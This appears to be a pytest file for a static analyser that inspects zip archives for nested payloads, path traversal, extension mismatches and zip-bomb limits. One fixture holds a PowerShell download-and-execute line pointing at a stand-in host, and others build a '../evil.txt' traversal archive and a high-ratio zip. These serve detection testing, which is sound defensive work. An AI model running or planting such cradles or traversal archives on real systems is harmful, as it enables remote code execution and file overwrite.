from __future__ import annotations

import io
import zipfile
from pathlib import Path

from exsoftware import analyze_bytes, analyze_path
from exsoftware.limits import RecursionLimits
from exsoftware.models import Report


def _zip_bytes(members: dict[str, bytes], *, compress=zipfile.ZIP_DEFLATED) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=compress) as archive:
        for name, data in members.items():
            archive.writestr(name, data)
    return buf.getvalue()


def _sound(report: Report) -> None:
    ids = {item.id for item in report.artifacts}
    for rel in report.relationships:
        assert rel.source_id in ids
        assert rel.target_id in ids
    for finding in report.findings:
        assert finding.artifact_id in ids
        for eid in finding.evidence_ids:
            assert any(item.id == eid for item in report.evidence_store)


def test_nested_zip_uses_same_pipeline():
    inner_ps = b"IEX (New-Object Net.WebClient).DownloadString('https://example.test/a')\n"
    inner_py = b"import subprocess\nsubprocess.run(['true'])\n"
    data = _zip_bytes({"script.ps1": inner_ps, "payload.py": inner_py, "readme.txt": b"hello"})
    report = analyze_bytes(data, name="sample.zip")
    names = {name for artifact in report.artifacts for name in artifact.names}
    assert "sample.zip" in names
    assert "script.ps1" in names
    assert "payload.py" in names
    contains = [item for item in report.relationships if item.type == "CONTAINS"]
    extracted = [item for item in report.relationships if item.type == "EXTRACTED_FROM"]
    assert len(contains) >= 3
    assert len(extracted) >= 3
    assert any(item.rule_id == "STR.URL.001" for item in report.findings)
    assert any(item.rule_id == "SCRIPT.PS.INDICATOR.001" for item in report.findings)
    assert any(item.rule_id == "SCRIPT.PY.IMPORT.001" for item in report.findings)
    child_runs = [item for item in report.analyzer_runs if item.artifact_id != report.root_artifact_id]
    assert child_runs
    _sound(report)


def test_duplicate_members_share_artifact():
    payload = b"print('same')\n"
    data = _zip_bytes({"a.py": payload, "nested/b.py": payload})
    report = analyze_bytes(data, name="dup.zip")
    py_artifacts = [item for item in report.artifacts if "a.py" in item.names or "nested/b.py" in item.names]
    content_ids = {item.content_id for item in py_artifacts if item.content_id}
    assert len(content_ids) == 1
    contains = [item for item in report.relationships if item.type == "CONTAINS" and item.target_id == next(iter(content_ids))]
    assert len(contains) == 2
    assert any(item.rule_id == "REC.DUP.001" for item in report.findings)


def test_extension_mismatch_inside_zip():
    data = _zip_bytes({"photo.jpg": b"PK\x03\x04" + b"\x00" * 30})
    # actually need a real nested zip as jpg
    nested = _zip_bytes({"x.txt": b"hi"})
    data = _zip_bytes({"photo.jpg": nested})
    report = analyze_bytes(data, name="outer.zip")
    assert any(item.rule_id == "ID.EXT.MISMATCH.001" for item in report.findings)
    _sound(report)


def test_path_traversal_member_not_extracted(tmp_path: Path):
    path = tmp_path / "evil.zip"
    with zipfile.ZipFile(path, "w") as archive:
        archive.writestr("../evil.txt", "nope")
        archive.writestr("ok.txt", "hello")
    report = analyze_path(path)
    assert any(item.rule_id == "ARC.TRAVERSAL.001" for item in report.findings)
    extracted_names = []
    for rel in report.relationships:
        if rel.type == "CONTAINS" and rel.extra.get("extracted"):
            extracted_names.append(rel.extra.get("member_name"))
    assert "ok.txt" in extracted_names
    assert "../evil.txt" not in extracted_names
    stubs = [item for item in report.artifacts if item.content_id is None and any(".." in name for name in item.names)]
    assert stubs


def test_malformed_zip():
    report = analyze_bytes(b"PK\x03\x04this is not a zip", name="broken.zip")
    assert report.identity.detected_type == "zip"
    assert any(item.rule_id == "ARC.PARSE.001" for item in report.findings)
    contains = [item for item in report.relationships if item.type == "CONTAINS"]
    assert contains == []


def test_excessive_recursion_is_recorded():
    level = b"leaf\n"
    blob = level
    name = "leaf.txt"
    for depth in range(4):
        blob = _zip_bytes({name: blob})
        name = f"l{depth}.zip"
    report = analyze_bytes(blob, name="deep.zip", limits=RecursionLimits(max_depth=1))
    assert any(item.rule_id == "REC.LIMIT.DEPTH.001" for item in report.findings)
    depths = {0}
    # Only the first nested zip should expand.
    nested_zips = [item for item in report.artifacts if item.detected_type == "zip"]
    assert nested_zips


def test_member_count_limit():
    members = {f"f{i}.txt": b"x" for i in range(8)}
    data = _zip_bytes(members)
    report = analyze_bytes(data, name="many.zip", limits=RecursionLimits(max_member_count=3))
    extracted = [item for item in report.relationships if item.type == "CONTAINS" and item.extra.get("extracted")]
    assert len(extracted) == 3
    assert any(item.rule_id == "REC.LIMIT.COUNT.001" for item in report.findings)


def test_expanded_size_limit():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_STORED) as archive:
        archive.writestr("big.txt", b"a" * 5000)
        archive.writestr("small.txt", b"b")
    report = analyze_bytes(
        buf.getvalue(),
        name="size.zip",
        limits=RecursionLimits(max_total_expanded_bytes=1000, max_member_bytes=10_000, max_compression_ratio=1000),
    )
    assert any(item.rule_id in {"REC.LIMIT.BYTES.001", "REC.LIMIT.MEMBER.001"} for item in report.findings)


def test_zip_bomb_ratio():
    zeros = b"\x00" * (2 * 1024 * 1024)
    data = _zip_bytes({"zeros.bin": zeros})
    report = analyze_bytes(data, name="bomb.zip", limits=RecursionLimits(max_compression_ratio=20, max_member_bytes=8 * 1024 * 1024))
    assert any(item.rule_id == "REC.LIMIT.RATIO.001" for item in report.findings)
    extracted = [item for item in report.relationships if item.type == "CONTAINS" and item.extra.get("extracted")]
    assert extracted == []


def test_recursion_can_be_disabled():
    data = _zip_bytes({"a.py": b"import os\n"})
    report = analyze_bytes(data, name="nope.zip", limits=RecursionLimits(enable_recursion=False))
    extracted = [item for item in report.relationships if item.type == "EXTRACTED_FROM"]
    assert extracted == []
    assert not any(item.rule_id == "SCRIPT.PY.IMPORT.001" for item in report.findings)
